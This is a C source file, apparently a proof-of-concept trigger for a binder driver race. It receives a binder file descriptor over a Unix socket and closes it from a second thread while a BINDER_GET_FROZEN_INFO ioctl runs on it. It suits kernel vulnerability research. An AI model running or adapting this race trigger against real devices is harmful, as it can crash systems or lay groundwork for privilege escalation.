#include <stdio.h>
#include <errno.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sys/un.h>
#include <stdbool.h>
#include <sys/socket.h>
#include <sys/uio.h>
#include <sys/ioctl.h>
#include <pthread.h>

#include "binder.h"

int lfd;
const char *const SOCKPATH = "/dev/proc2.sock";
pthread_t worker;
int binderfd;

int talk_to_device(int binderfd) {
    int status;
    struct binder_frozen_status_info info = { 0 };
  
    status = ioctl(binderfd, BINDER_GET_FROZEN_INFO, &info);
    return status;
}

void * thread_worker(void * arg) {
  dprintf(0, "[/] worker: Sleeping\n");
  sleep(1);
  dprintf(0, "[/] worker: Closing file\n");
  close(binderfd);
  dprintf(0, "[+] worker: Closed file\n");
  pthread_exit(0);
}

int receive_fd(int socket) {
  int fd;
  struct msghdr hdr = {0};
  struct cmsghdr * chdr;
  unsigned char * cmsg;
  struct iovec io;
  char mbuf[256];
  char cbuf[256];

  io.iov_base = mbuf;
  io.iov_len = sizeof(mbuf);

  hdr.msg_iov = &io;
  hdr.msg_iovlen = 1;
  hdr.msg_control = cbuf;
  hdr.msg_controllen = sizeof(cbuf);

  if (recvmsg(socket, &hdr, 0) == -1) {
    dprintf(0, "[-] Failed to recvmsg: %s", strerror(errno));
    return -1;
  }

  dprintf(0, "[+] Received message\n");
  chdr = CMSG_FIRSTHDR(&hdr);
  cmsg = CMSG_DATA(chdr);

  fd = *(int *) cmsg;
  return fd;
}

int main(int argc, char **argv) {
  struct sockaddr_un addr = {0};
  int sfd;
  int cfd;
  
  lfd = open("proc2.txt", O_CREAT | O_WRONLY | O_TRUNC);
  
  dprintf(0, "[+] Setting up socket at: %s\n", SOCKPATH);
  sfd = socket(AF_UNIX, SOCK_STREAM, 0);
  if (sfd == -1) {
    dprintf(0, "[-] Failed to create socket: %s\n", strerror(errno));
    exit(1);
  }

  addr.sun_family = AF_UNIX;
  strcpy(addr.sun_path, SOCKPATH);

  if (bind(sfd, (struct sockaddr *) &addr, sizeof(addr)) == -1) {
    dprintf(0, "[-] Failed to bind socket: %s\n", strerror(errno));
    exit(1);
  }

  if (listen(sfd, 1) == -1) {
    dprintf(0, "[-] Failed to listen: %s\n", strerror(errno));
    exit(1);
  }

  dprintf(0, "[/] Waiting for connection\n");
  cfd = accept(sfd, NULL, NULL);
  if (cfd == -1) {
    dprintf(0, "[-] Failed to accept: %s\n", strerror(errno));
    exit(1);
  }

  dprintf(0, "[+] Got connection\n");
  binderfd = receive_fd(cfd);
  dprintf(0, "[+] Received binder fd: %d\n", binderfd);

  pthread_create(&worker, NULL, thread_worker, NULL);
  pthread_detach(worker);

  dprintf(0, "[/] Talking to device\n");
  if (talk_to_device(binderfd) == -1) {
    dprintf(0, "[-] ioctl failed\n");
    exit(1);
  }

  dprintf(0, "[+] Success\n");
  return 0;
}
